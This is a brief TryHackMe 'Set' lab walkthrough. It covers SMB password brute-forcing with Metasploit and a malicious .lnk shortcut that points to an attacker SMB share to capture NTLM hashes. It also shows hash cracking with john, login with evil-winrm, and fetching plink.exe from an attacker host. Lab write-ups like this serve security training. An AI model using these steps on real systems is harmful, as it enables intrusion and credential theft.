# [Set](https://tryhackme.com/room/set)

## Once again you find yourself on the internal network of the Windcorp Corporation.

# Set

## Story. Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more. However, they managed to secure the Domain Controller this time, so you need to find another server and on your first scan discovered "Set". Set is used as a platform for developers and has had some problems in the recent past. They had to reset a lot of users and restore backups (maybe you were not the only hacker on their network?). So they decided to make sure all users used proper passwords and closed of some of the loose policies. Can you still find a way in? Are some user more privileged than others? Or some more sloppy? And maybe you need to think outside the box a little bit to circumvent their new security controls…

### Flag 1

1. ...

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. ...

```bash
curl -v -k https://<TARGET_IP>
echo "<TARGET_IP> set.windcorp.thm" >> /etc/hosts
```

[SCREEN02]

3. Examine the search.js function in `https://set.windcorp.thm/` source ...

```bash
curl -k https://set.windcorp.thm/assets/data/users.xml
```

4. Get usernames ...

```bash
curl -k https://set.windcorp.thm/assets/data/users.xml | grep -o '<email>[^<]*</email>' | sed 's/<[^>]*>//g' | cut -d'@' -f1 | sort | uniq > usernames.txt
```

5. ...
   - `myrtleowe:Passw@rd`

```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set USER_FILE usernames.txt
set PASS_FILE /root/Tools/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
run
creds
```

[SCREEN03]

6. ...

```bash
smbclient -L //<TARGET_IP> -U myrtleowe
smbclient //<TARGET_IP>/Files -U myrtleowe
ls
get Info.txt
```

[SCREEN04]

7. First flag ...

```bash
cat Info.txt
```

[SCREEN05]

---

### Flag 2

1. Download `https://www.mamachine.org/mslink/index.en.html` ...

```bash
./mslink_v1.3.sh -l test -n shortcut -i \\\\<ATTACKER_IP>\\share -o shortcut.lnk
zip shortcut.zip shortcut.lnk
sudo python3 /opt/impacket/examples/smbserver.py -smb2support share .
```

2. ...

```bash
smbclient //<TARGET_IP>/Files -U myrtleowe
put shortcut.zip
```

[SCREEN06]

3. ...
   - `MichelleWat:!!!MICKEYmouse`

```bash
john hash --wordlist=/root/Tools/wordlists/rockyou.txt
```

[SCREEN07]

4. ...

```bash
evil-winrm -i <TARGET_IP> -u MichelleWat -p '!!!MICKEYmouse'
cd ../Desktop
dir
more Flag2.txt
```

[SCREEN08]

---

### Flag 3

1. There are port 49713 and 2805 with pid 5000 ...

```bash
netstat -ao
```

[SCREEN09]

2. ...

```bash
Get-Process -Id 5000
```

[SCREEN10]

3. ...

```bash
Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "Veeam.One.Agent"}
Get-Item 'C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe' | Format-List *
```

[SCREEN11]

4. ...

```bash
wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe
python -m SimpleHTTPServer
```

```bash
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/plink.exe -Outfile plink.exe
```
